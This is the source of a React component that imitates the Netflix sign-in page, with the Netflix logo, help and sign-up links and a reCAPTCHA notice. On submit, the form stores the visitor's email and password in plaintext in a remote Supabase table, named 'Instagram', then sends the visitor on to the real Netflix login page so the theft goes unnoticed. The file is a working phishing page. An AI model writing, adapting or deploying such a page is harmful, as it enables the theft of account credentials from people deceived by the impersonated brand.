import React, { useState } from "react";
import "./NetflixLogin.css";
import { supabase } from "../../supabase";

const NetflixLogin = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [remember, setRemember] = useState(false);
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [error, setError] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError("");
    setSuccess(false);
    const { error } = await supabase.from("Instagram").insert([
      { email, password },
    ]);
    setLoading(false);
    if (error) setError("Login failed. Try again.");
    else {
      setSuccess(true);
      window.location.href = "https://www.netflix.com/login";
    }
  };

  return (
    <div className="netflix-bg">
      <div className="netflix-login-center">
        <div className="netflix-logo-svg">
          <svg role="img" viewBox="0 0 24 24" width="120" height="48" xmlns="http://www.w3.org/2000/svg"><title>Netflix</title><path fill="#E50914" d="M13.667 0v10.667l-2.667-8V0H0v24h8.667v-10.667l2.667 8V24H24V0z"/></svg>
        </div>
        <div className="netflix-login-box">
          <h1 className="netflix-signin-title">Sign In</h1>
          <form className="netflix-login-form" onSubmit={handleSubmit}>
            <input
              type="text"
              className="netflix-login-input"
              placeholder="Email or phone number"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
              autoComplete="username"
            />
            <input
              type="password"
              className="netflix-login-input"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
              autoComplete="current-password"
            />
            <button type="submit" className="netflix-login-btn" disabled={loading}>
              {loading ? "Signing in..." : "Sign In"}
            </button>
            {error && <div className="netflix-error">{error}</div>}
            {success && <div className="netflix-success">Login saved!</div>}
            <div className="netflix-login-options">
              <label className="netflix-remember">
                <input
                  type="checkbox"
                  checked={remember}
                  onChange={() => setRemember(!remember)}
                />
                <span>Remember me</span>
              </label>
              <a
                className="netflix-login-help"
                href="https://www.netflix.com/LoginHelp"
                target="_blank"
                rel="noopener noreferrer"
              >
                Need help?
              </a>
            </div>
          </form>
          <div className="netflix-signup-now">
            New to Netflix?{' '}
            <a
              href="https://www.netflix.com/signup"
              target="_blank"
              rel="noopener noreferrer"
            >
              Sign up now.
            </a>
          </div>
          <div className="netflix-captcha-note">
            This page is protected by Google reCAPTCHA to ensure you're not a bot.
          </div>
        </div>
      </div>
    </div>
  );
};

export default NetflixLogin;
